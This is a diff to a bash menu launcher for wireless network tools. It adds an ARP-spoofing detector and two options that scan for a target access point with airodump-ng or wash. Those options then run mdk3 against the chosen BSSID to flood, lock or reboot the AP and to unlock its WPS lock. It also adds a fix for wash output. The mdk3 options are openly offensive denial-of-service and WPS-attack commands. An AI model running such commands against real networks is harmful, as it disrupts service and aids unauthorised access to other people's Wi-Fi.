@@ -82,6 +82,9 @@ clear
 				echo -e "13) KickThemOut        Kick clients out of your network"
 				echo -e "14) Ghost-Phisher      Fake AP,MITM,Session hijacking etc..."
 				echo -e "15) The Eye            Detects ARP poisoning DNS spoofing etc..."
+				echo -e "16) ShARP              Detects who is spoofing on your network"
+				echo -e "17) Mdk3-master        Tries to lock / reboot AP and more..."
+				echo -e "18) Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
 				echo -e "00) Main menu"
 				echo -e " 0) EXIT"
 				echo -e "Choose: "
@@ -168,6 +171,45 @@ clear
 					cd /root/The-Eye
 					./TheEye
 					cd
+				elif [ "$APPP" = "16" ]
+				then
+					echo -e "Enter the name of the interface you want to defend with: "
+					read -e NAMEINT
+					clear	
+					cd /root/shARP
+					./shARP.sh -d $NAMEINT
+					cd
+				elif [ "$APPP" = "17" ]
+				then
+					clear	
+					echo -e "Press any key to start scanning."
+					echo -e "Press CTRL C when you find your target AP"
+					read
+					airodump-ng wlan0mon
+					echo -e "Enter your target's BSSID: "
+					read -e MDBSSID
+					echo -e "Enter your target's channel: "
+					read -e MDCHANN
+					echo -e "Enter frames per second(etc 50): "
+					read -e FPS
+					clear
+					xterm -e 'mdk3 wlan0mon t $MDCHANN $MDBSSID $FPS'		
+				elif [ "$APPP" = "18" ]
+				then
+					clear	
+					echo -e "Press any key to start scanning with wash."
+					read
+					gnome-terminal -e 'wash -i wlan0mon'
+					echo -e "Enter your target's BSSID: "
+					read -e MDBSSID
+					echo -e "Enter your target's ESSID: "
+					read -e MDESSID
+					#~ echo -e "Enter your target's channel: "
+					#~ read -e MDCHANN
+					echo -e "Enter frames per second(etc 50): "
+					read -e FPS
+					clear
+					xterm -e 'mdk3 wlan0mon x 0 -t $MDBSSID -n $MDESSID -s $FPS'		
 				elif [ "$APPP" = "6" ]
 				then
 					clear	
@@ -468,6 +510,7 @@ clear
 		#---------------------------------------------------------------------------------------------------------------------------
 		echo -e "-----------------------------ERRORS------------------------------"
 		echo -e " 1) Fix no audio issue"
+		echo -e " 2) No output in wash"
 		#~ echo -e " 2) "
 		echo -e " 00) Main menu"
 		echo -e " 0) EXIT"
@@ -499,6 +542,18 @@ clear
 			sleep 2
 			echo -e " "
 			echo -e "If it wasn't fix , then try rebooting"
+		elif [ "$ERRS" = "2" ]
+		then
+			clear
+			echo -e "Ok...Lets try to fix this..."
+			sleep 1
+			mkdir /etc/reaver
+			echo -e "It seems to be fixed."
+			echo -e "Enter you interface"
+			read INTWASH
+			echo -e "Press any key to test wash"
+			echo -e "Also try "wash -i wlan0mon -a" to display all networks"
+			wash -i $INTWASH
 		elif [ "$ERRS" = "0" ]
 		then
 			clear
